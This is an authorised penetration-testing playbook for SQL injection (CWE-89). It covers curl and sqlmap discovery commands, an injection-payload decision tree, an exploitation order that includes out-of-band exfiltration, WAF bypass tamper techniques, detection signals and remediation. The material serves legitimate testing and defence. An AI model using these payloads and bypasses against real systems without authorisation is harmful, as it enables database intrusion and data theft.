# Playbook - SQL Injection

| Field | Value |
|---|---|
| `playbook_id` | PB-WEB-SQLI |
| `cwe_id` | CWE-89 |
| `owasp_top10` | A03:2021 - Injection |
| `owasp_controls` | INPUT-2, INPUT-4, AUTHZ-4 |
| `payload_corpus` | `02-payloads/web/sqli/` |
| `automation` | `05-engines/sqlmap/` |
| `wordlist` | `03-wordlists/web/fuzzing/injection-words.txt` |
| `detections` | `06-defense/wazuh/rules/1005-web-app.rules`, `06-defense/suricata/rules/ssa-web-attacks.rules` |

## 1. Preconditions

* Written authorisation, scope identifier, and a test window.
* A staging mirror is preferred: production database writes are out of scope
  unless explicitly listed.

## 2. Discovery

```bash
# Manual: probe every parameter boundary with a single-quote and a boolean pair
curl -s "https://TARGET/search?q='"                      -o /dev/null -w '%{http_code}\n'
curl -s "https://TARGET/search?q=a%27%20AND%20%271%27=%271" -o /dev/null -w '%{http_code}\n'

# Automated fingerprinting
python tools/ssactl.py index --root .
sqlmap -u "https://TARGET/search?q=*" --batch --level=3 --risk=2 \
       --tamper=space2comment,between --dbms= --level=5 --technique=BEUSTQ
```

## 3. Decision tree

```
q'  ->  500 / WAF block / time delta        ->  likely injectable, escalate
q'' ->  same as q'                           ->  numeric or non-string context
q' AND '1'='1   ==  q' AND '1'='2'          ->  boolean-based confirmed
q' AND SLEEP(5)-- -   ->  time delta >= 5s   ->  time-based confirmed
q' UNION SELECT NULL-- -                    ->  error / column count probe
```

## 4. Exploitation order (least to most invasive)

| Order | Technique | Payload family | Risk |
|---|---|---|---|
| 1 | Boolean differential | `PL-WEB-SQLI-0001..0010` | none |
| 2 | UNION column mapping | `PL-WEB-SQLI-0020..0040` | none |
| 3 | Error-based extraction | `PL-WEB-SQLI-0050..0070` | low |
| 4 | Time-based blind | `PL-WEB-SQLI-0080..0095` | low (2-3 % CPU) |
| 5 | Out-of-band exfil | `PL-WEB-SQLI-0100..0110` | medium (DNS egress) |

Stop at the minimum proof required by the rules of engagement. Demonstrating
`current_user()` is enough; dumping `users` is usually not.

## 5. Bypass notes (see `02-payloads/web/sqli/README.md`)

| Obstacle | Bypass | sqlmap tamper |
|---|---|---|
| Space filtered | `/**/`, `%09` | `space2comment` |
| `OR` filtered | `||`, `OR/**/1` | `randomcase` |
| Single quote stripped | CHAR()/CONCAT() | `chardoubleencode` |
| WAF SQLi keyword | inline comments | `space2hash`, `randomcomments` |
| Stacked queries disabled | UNION / subquery only | - |

## 6. Detection expectations

| Layer | Expected signal |
|---|---|
| Network | Suricata `ssa-web-attacks.rules` sid `3001001+`, `http.uri` containing boolean tautology |
| Host | Wazuh rule `86610` (web log) with `sqlmap` / `UNION SELECT` / `SLEEP(` in query string |
| WAF | Managed rule hits, source IP correlation over 60 s |
| Database | Sudden spike in parse errors, `xp_cmdshell`, `INTO OUTFILE` |

## 7. Remediation

1. Parameterised queries / prepared statements - the only complete fix (OWASP
   INPUT-2).
2. Least-privilege database accounts; the application never holds DDL rights.
3. Input validation with an allow-list for identifiers (OWASP INPUT-4).
4. Suppress verbose DB errors in responses (OWASP ERR-1).
5. Detection: alert on tautology patterns even after remediation - attackers
   still probe, and probing is a leading indicator.
